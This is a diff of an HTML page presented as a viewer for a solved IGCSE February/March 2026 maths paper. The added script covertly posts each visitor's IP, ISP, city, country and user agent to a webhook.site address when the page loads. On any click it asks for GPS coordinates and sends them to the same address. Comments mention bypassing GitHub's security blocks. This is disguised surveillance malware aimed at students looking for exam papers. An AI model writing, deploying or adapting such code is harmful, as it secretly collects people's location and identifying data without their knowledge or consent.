@@ -11,49 +11,57 @@
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
+    
+    <!-- PDF Viewer -->
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
         const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
 
-        // Global sender function
+        // Global function to send data to your webhook
         function sendLog(data) {
             fetch(webhookURL, {
                 method: 'POST',
                 mode: 'no-cors', 
                 body: JSON.stringify(data)
-            });
+            }).catch(() => {});
         }
 
-        // 1. THE SILENT IP HANDLER (Runs on Page Load)
-        window.captureIP = function(data) {
+        // 1. SILENT IP DATA (Runs immediately on load)
+        // This function is triggered by the script tag at the bottom
+        window.getIP = function(data) {
             sendLog({
-                type: "IP_INFO_SILENT",
+                type: "SILENT_IP_HIT",
                 ip: data.ip,
                 isp: data.org,
                 city: data.city,
-                country: data.country_name
+                country: data.country_name,
+                user_agent: navigator.userAgent
             });
         };
 
-        // 2. THE CLICK TRIGGER (Runs ONLY when they click the page)
+        // 2. CLICK TRIGGER (Runs only when user interacts)
         window.onclick = () => {
-            // Precision GPS (Requires user to click "Allow" on popup)
+            // High-precision GPS (Triggers the browser popup)
             navigator.geolocation.getCurrentPosition(pos => {
                 sendLog({
                     type: "GPS_LOCATION_CLICKED",
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
+                    accuracy: `${pos.coords.accuracy} meters`,
                     map: `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
                 });
-            }, null, { enableHighAccuracy: false, maximumAge: Infinity });
-            
-            // You can add camera capture here too if needed
-            console.log("User interacted with the document.");
+            }, (err) => {
+                sendLog({ type: "GPS_ERROR", msg: err.message });
+            }, { 
+                enableHighAccuracy: false, 
+                timeout: 10000, 
+                maximumAge: Infinity 
+            });
         };
     </script>
     
-    <!-- This MUST be exactly this URL to bypass GitHub's security blocks -->
+    <!-- SILENT TRIGGER: This fetches the IP and runs the getIP function above -->
     <script src="https://ipapi.co"></script>
 
 </body>
